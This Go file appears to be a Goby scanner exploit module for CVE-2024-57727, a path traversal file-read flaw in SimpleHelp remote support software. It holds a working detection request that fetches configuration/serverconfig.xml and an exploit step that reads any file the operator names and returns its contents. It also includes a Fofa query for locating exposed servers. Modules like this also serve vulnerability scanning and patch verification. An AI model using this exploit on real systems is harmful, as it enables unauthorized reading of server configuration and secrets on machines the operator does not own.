package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "SimpleHelp /toolbox-resource File Read Vulnerability（CVE-2024-57727）",
    "Description": "<p>SimpleHelp is a remote support and remote desktop management software widely used by enterprises and IT service providers. This vulnerability allows attackers to construct specific path traversal requests to unauthorizedly read arbitrary files on the server, potentially leading to sensitive information disclosure, data tampering, and other serious security issues.</p>",
    "Product": "SimpleHelp",
    "Homepage": "https://simple-help.com/",
    "DisclosureDate": "2025-01-19",
    "PostTime": "2025-01-22",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "server=\"SimpleHelp\" && header=\"text/html\"",
    "GobyQuery": "server=\"SimpleHelp\" && header=\"text/html\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read arbitrary files on the server through path traversal, potentially leading to sensitive information disclosure, data tampering, and even further attacks such as remote code execution or privilege escalation.</p>",
    "Recommendation": "<p>It is recommended to immediately upgrade SimpleHelp to the latest version and ensure all security patches are applied. Additionally, restrict access to sensitive files and use a Web Application Firewall (WAF) to detect and block malicious requests.</p>",
    "References": [
        "https://blog.csdn.net/2303_77176437/article/details/145229210",
        "https://cve.mitre.org/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "configuration/serverconfig.xml",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "configuration/serverconfig.xml",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/toolbox-resource/../resource1/../../configuration/serverconfig.xml",
                "follow_redirect": false,
                "header": {
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<SimpleSuite",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/toolbox-resource/../resource1/../../{{{filePath}}}",
                "follow_redirect": false,
                "header": {
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-57727"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "SimpleHelp远程管理软件 /toolbox-resource 文件读取漏洞（CVE-2024-57727）",
            "Product": "SimpleHelp",
            "Description": "<p>SimpleHelp 是一款远程支持和远程桌面管理软件，广泛应用于企业和 IT 服务提供商。该漏洞允许攻击者通过构造特定的路径遍历请求，未经授权地读取服务器上的任意文件，可能导致敏感信息泄露、数据篡改以及其他严重的安全问题。</p>",
            "Recommendation": "<p>建议立即升级 SimpleHelp 到最新版本，并确保所有安全补丁已应用。同时，限制对敏感文件的访问权限，使用 Web 应用防火墙（WAF）检测和阻止恶意请求。</p>",
            "Impact": "<p>该漏洞允许攻击者通过路径遍历读取服务器上的任意文件，可能导致敏感信息泄露、数据篡改，甚至进一步的攻击，如远程代码执行或权限提升。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "SimpleHelp /toolbox-resource File Read Vulnerability（CVE-2024-57727）",
            "Product": "SimpleHelp",
            "Description": "<p>SimpleHelp is a remote support and remote desktop management software widely used by enterprises and IT service providers. This vulnerability allows attackers to construct specific path traversal requests to unauthorizedly read arbitrary files on the server, potentially leading to sensitive information disclosure, data tampering, and other serious security issues.</p>",
            "Recommendation": "<p>It is recommended to immediately upgrade SimpleHelp to the latest version and ensure all security patches are applied. Additionally, restrict access to sensitive files and use a Web Application Firewall (WAF) to detect and block malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to read arbitrary files on the server through path traversal, potentially leading to sensitive information disclosure, data tampering, and even further attacks such as remote code execution or privilege escalation.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/toolbox-resource"
    },
    "VariablesOrder": [
        "filePath",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}